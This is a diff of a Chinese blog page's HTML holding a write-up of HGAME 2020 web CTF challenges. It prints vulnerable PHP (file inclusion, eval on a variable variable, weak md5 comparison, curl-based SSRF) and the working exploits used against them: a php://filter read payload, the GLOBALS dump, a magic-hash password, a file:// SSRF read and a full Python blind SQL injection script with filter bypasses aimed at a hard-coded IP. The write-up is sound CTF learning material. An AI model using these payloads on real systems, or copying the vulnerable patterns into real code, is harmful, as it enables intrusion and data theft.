@@ -470,36 +470,169 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="回显"></p>
 <p>这个“用户名或密码错误”回显直接否定了我们任何关于sql注入的可能。加上没什么隐藏信息，导致我当时这题就先放着去做第二道了。之后回过头看时，才想起来要抓个包。于是发现存在一个跳转<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="action"></p>
 <p>看到action就立马有了新思路。因为这正是文件包含漏洞利用的必备参数。那么就试试读文件吧。果断尝试伪协议。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
-<p>这里自己被自己之前写的文章坑到了……原来一时兴起写了个“伪协议总能给你惊喜”，结果文章里注重<code>php://input</code>，但没有发现<code>php://filter</code>读文件的payload写错了…..自己有点淡忘就拿文章里的payload复制粘贴，结果半天不出结果。后来才发现自己写错了。<br>总之读到源码,base64解码后：<br>index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action = @$_GET[<span class="string">'action'</span>];</span><br><span class="line">$filter = <span class="string">"/config|etc|flag/i"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($filter, $_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker get out!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">include</span> $action;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) || <span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: ?action=login.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现admin.php的存在，以及login.php可能存在猫腻。 那也用伪协议读下<br>login.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($admin_password == md5($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'username'</span>] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $_POST[<span class="string">'username'</span>];</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#html部分略</span></span><br></pre></td></tr></table></figure>
-<p>admin.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'img_url'</span>])) &#123;</span><br><span class="line">        $img_url = @$_POST[<span class="string">'img_url'</span>];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        <span class="keyword">if</span> (@$url_array[<span class="string">'host'</span>] !== <span class="string">"localhost"</span> &amp;&amp; $url_array[<span class="string">'host'</span>] !== <span class="string">"timgsa.baidu.com"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">"static/logo.png"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Cosmos<span class="string">'Blog - 后台管理&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;a href="logout.php"&gt;退出登陆&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;div style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Welcome &lt;?php echo $_SESSION['</span>username<span class="string">'];?&gt; &lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;form action="" method="post"&gt;</span></span><br><span class="line"><span class="string">            &lt;fieldset style="width: 30%;height: 20%;float:left"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;插入图片&lt;/legend&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;label&gt;图片url: &lt;input type="text" name="img_url" placeholder=""&gt;&lt;/label&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;button type="submit" name="submit"&gt;插入&lt;/button&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;fieldset style="width: 30%;height: 20%;float:left"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;评论管理&lt;/legend&gt;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;待开发..&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">        &lt;fieldset style="width: 30%;height: 20%;"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;文章列表&lt;/legend&gt;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;待开发..&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">        &lt;fieldset style="height: 50%"&gt;</span></span><br><span class="line"><span class="string">            &lt;div style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">                &lt;img height='</span><span class="number">200</span><span class="string">' width='</span><span class="number">500</span><span class="string">' src='</span>data:image/jpeg;base64,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> insert_img() ? insert_img() : base64_encode(file_get_contents(<span class="string">"static/error.jpg"</span>)); <span class="meta">?&gt;</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code>?action=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>这里自己被自己之前写的文章坑到了……原来一时兴起写了个“伪协议总能给你惊喜”，结果文章里注重<code>php://input</code>，但没有发现<code>php://filter</code>读文件的payload写错了…..自己有点淡忘就拿文章里的payload复制粘贴，结果半天不出结果。后来才发现自己写错了。<br>总之读到源码,base64解码后：<br>index.php</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+session_start();
 
+if(isset($_SESSION[&#39;username&#39;])) {
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+
+$action = @$_GET[&#39;action&#39;];
+$filter = &quot;/config|etc|flag/i&quot;;
+
+if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {
+    if(preg_match($filter, $_GET[&#39;action&#39;])) {
+        echo &quot;Hacker get out!&quot;;
+        exit();
+    }
+        include $action;
+}
+elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {
+    header(&quot;Location: ?action=login.php&quot;);
+    exit();
+}</code></pre>
+<p>发现admin.php的存在，以及login.php可能存在猫腻。 那也用伪协议读下<br>login.php</p>
+<pre><code class="php">&lt;?php
+include &quot;config.php&quot;;
+session_start();
+
+//Only for debug
+if (DEBUG_MODE){
+    if(isset($_GET[&#39;debug&#39;])) {
+        $debug = $_GET[&#39;debug&#39;];
+        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
+            die(&quot;args error!&quot;);
+        }
+        eval(&quot;var_dump($$debug);&quot;);
+    }
+}
+
+if(isset($_SESSION[&#39;username&#39;])) {
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+else {
+    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {
+        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){
+            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];
+            header(&quot;Location: admin.php&quot;);
+            exit();
+        }
+        else {
+            echo &quot;用户名或密码错误&quot;;
+        }
+    }
+}
+?&gt;
+#html部分略</code></pre>
+<p>admin.php</p>
+<pre><code class="php">&lt;?php
+include &quot;config.php&quot;;
+session_start();
+if(!isset($_SESSION[&#39;username&#39;])) {
+    header(&#39;Location: index.php&#39;);
+    exit();
+}
+
+function insert_img() {
+    if (isset($_POST[&#39;img_url&#39;])) {
+        $img_url = @$_POST[&#39;img_url&#39;];
+        $url_array = parse_url($img_url);
+        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {
+            return false;
+        }   
+        $c = curl_init();
+        curl_setopt($c, CURLOPT_URL, $img_url);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        $res = curl_exec($c);
+        curl_close($c);
+        $avatar = base64_encode($res);
+
+        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
+            return $avatar;
+        }
+    }
+    else {
+        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));
+    }
+}
+?&gt;
+
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Cosmos&#39;Blog - 后台管理&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;a href=&quot;logout.php&quot;&gt;退出登陆&lt;/a&gt;
+        &lt;div style=&quot;text-align: center;&quot;&gt;
+            &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&#39;username&#39;];?&gt; &lt;/h1&gt;
+        &lt;/div&gt;
+        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
+            &lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;
+                &lt;legend&gt;插入图片&lt;/legend&gt;
+                &lt;p&gt;&lt;label&gt;图片url: &lt;input type=&quot;text&quot; name=&quot;img_url&quot; placeholder=&quot;&quot;&gt;&lt;/label&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;button type=&quot;submit&quot; name=&quot;submit&quot;&gt;插入&lt;/button&gt;&lt;/p&gt;
+            &lt;/fieldset&gt;
+        &lt;/form&gt;
+        &lt;fieldset style=&quot;width: 30%;height: 20%;float:left&quot;&gt;
+                &lt;legend&gt;评论管理&lt;/legend&gt;
+                &lt;h2&gt;待开发..&lt;/h2&gt;
+        &lt;/fieldset&gt;
+        &lt;fieldset style=&quot;width: 30%;height: 20%;&quot;&gt;
+                &lt;legend&gt;文章列表&lt;/legend&gt;
+                &lt;h2&gt;待开发..&lt;/h2&gt;
+        &lt;/fieldset&gt;
+        &lt;fieldset style=&quot;height: 50%&quot;&gt;
+            &lt;div style=&quot;text-align: center;&quot;&gt;
+                &lt;img height=&#39;200&#39; width=&#39;500&#39; src=&#39;data:image/jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;
+            &lt;/div&gt;
+        &lt;/fieldset&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
 <p>那么不难发现几个源码里的要点：<br>index.php中：<br>ban掉了flag与config。而后面可以注意到config.php被admin.php与login.php包含(include)了。</p>
 <p>login.php中<br>1.存在一个参数debug,以及对这参数的<code>eval()</code>。也就是说我们获得了一个可控可执行的参数，但是要绕正则。<br>2.稍微注意下，登录时<code>username</code>以及<code>password</code>均需与对应的参数（肯定在config.php中，所以我们不可能通过其他途径登录）相等。但是password偏偏是<code>==</code>的弱类型相等。这就代表password一定会有漏洞。且甚至可以猜到，password的md5值开头是0e。这样才会有弱类型比较漏洞利用。</p>
 <p>admin.php中<br>1.下面一段代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$c = curl_init();</span><br><span class="line">curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$res = curl_exec($c);</span><br><span class="line">curl_close($c);</span><br><span class="line">$avatar = base64_encode($res);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$c = curl_init();
+curl_setopt($c, CURLOPT_URL, $img_url);
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$res = curl_exec($c);
+curl_close($c);
+$avatar = base64_encode($res);</code></pre>
 <p>有点眼熟，再加上前面一段对host的判别，可以想见是存在ssrf漏洞。（虽然我不熟）百度一下，发现这果然是ssrf漏洞的经典代码。也提醒了我要准备学习ssrf的笔记了……</p>
 <p>然后就是存在一个图片插入的功能。而且它会返回base64编码后的<code>file_get_contents()</code>结果。这也是ssrf利用中能拿到回显结果的重要细节。</p>
 <p>所以思路很清晰了，从login.php下手，登录后台，利用ssrf拿到根目录下的flag。</p>
 <p>首先是关于<code>debug</code>参数的利用了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="php">if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
+            die(&quot;args error!&quot;);
+        }
+        eval(&quot;var_dump($$debug);&quot;);</code></pre>
 <p>主要是这段代码，自己开始只理解成过滤了一堆东西……后来百度下，突然想起来原来ichunqiu上做过的一道题。叫做爆破-1。但实际上是一个全局变量的利用（因为它include了flag.php,所以传参<code>globals</code>就能通过<code>eval($$a)</code>拿flag）。而这题同样也include了config.php……回过头看正则，就会发现这个正则其实恰好限定了传参为变量名。具体参考stackoverflow：<br><a href="https://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-php" target="_blank" rel="noopener">https://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-php</a><br>它要求开头第一个字母可以是字母下划线及不可见字符，后面其他字母可以是字母数字及不可见字符。（\x7f-\xff 确切的说，可以匹配utf-8编码中的非ascii编码字符）。总之确定可以传参数后，我们试试<code>GLOBALS</code><br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="GLOBALS"><br>直接拿到用户名Cosmos!，以及密码是0e开头的事实。故选个0e开头MD5的字符串登录进去。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cosmos!</span><br><span class="line">s878926199a</span><br></pre></td></tr></table></figure>
-<p>进去后我也卡了好久……ssrf不熟，只能盲目的试。能确定的是需要host被解析为<code>localhost</code>,尝试直接<code>http://localhost</code>但是回显总是那张报错的图。唯一不同的在于，当我尝试<code>http://localhost/flag</code>时，返回的是404,也就是说curl成功执行了。所以说，flag应该是在服务器根目录，不是网站根目录。问题变为怎么读了。在查阅资料时突然注意到file协议可以读文件。于是换下file://协议<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag.PNG"><br>居然成了。。。解码可拿到flag。后来郁师傅解释说，因为index.php存在302，curl不能跟随，获取是空的。结合源码中获取为空则返回错误图片这点，就明白了为什么<code>http://localhost</code>总是没结果<br>但我估计还有其他方法做，这里马一手。</p>
+<pre><code>Cosmos!
+s878926199a</code></pre><p>进去后我也卡了好久……ssrf不熟，只能盲目的试。能确定的是需要host被解析为<code>localhost</code>,尝试直接<code>http://localhost</code>但是回显总是那张报错的图。唯一不同的在于，当我尝试<code>http://localhost/flag</code>时，返回的是404,也就是说curl成功执行了。所以说，flag应该是在服务器根目录，不是网站根目录。问题变为怎么读了。在查阅资料时突然注意到file协议可以读文件。于是换下file://协议<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag.PNG"><br>居然成了。。。解码可拿到flag。后来郁师傅解释说，因为index.php存在302，curl不能跟随，获取是空的。结合源码中获取为空则返回错误图片这点，就明白了为什么<code>http://localhost</code>总是没结果<br>但我估计还有其他方法做，这里马一手。</p>
 <h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>说来惭愧，这题开始我ip又被ban了hhhh。好在貌似是题目问题，后来出题人调整了就好了。首先根据FUZZ可以确认存在sql注入。输入1回显正常，输入<code>1&#39;</code>无回显。输入<code>1&quot;</code>回显正常。那么显然，这是盲注的味道。因为只有正确错误两种回显方式，所以确认是布尔盲注。</p>
 <p>然后fuzz了下ban掉的关键字：<br>空格，可以用<code>%0a</code>替代</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select</span><br></pre></td></tr></table></figure>
-<p>关键字可以双写绕过</p>
+<pre><code>select</code></pre><p>关键字可以双写绕过</p>
 <p>那不多说直接放盲注脚本了。整体还是比较简单的（之前总结的模板直接拿来套hhh）：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="comment">#hgame&#123;w0w_sql_InjeCti0n_Is_S0_IntereSting!!&#125;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">"http://139.199.182.61/index.php?id=1'and%0aascii(substr((selselectect%0afl4444444g%0afrom%0af1aggggggggggggg),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">        <span class="comment">#print(payload）</span></span><br><span class="line">        res=requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>: <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
 
-
-
-
+flag=&#39;&#39;
+#hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}
+for i in range(1,50):
+    a=0
+    print(i)
+    for j in range(32,128):
+        payload=&quot;http://139.199.182.61/index.php?id=1&#39;and%0aascii(substr((selselectect%0afl4444444g%0afrom%0af1aggggggggggggg),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;%23&quot;
+        #print(payload）
+        res=requests.get(url=payload)
+        if &#39;Hello&#39; in res.text:
+            flag+=chr(j)
+            print(flag)
+            a=1
+    if a==0: break
+</code></pre>
 <h1 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h1><p>这道题确切说不算难题吧。但是自己仍然耗费了2个多小时在这上面，感觉挺划不来的……</p>
 <p>话不多说，先看题目<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/5.jpg" class="lazyload" data-srcset="5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="源码"></p>
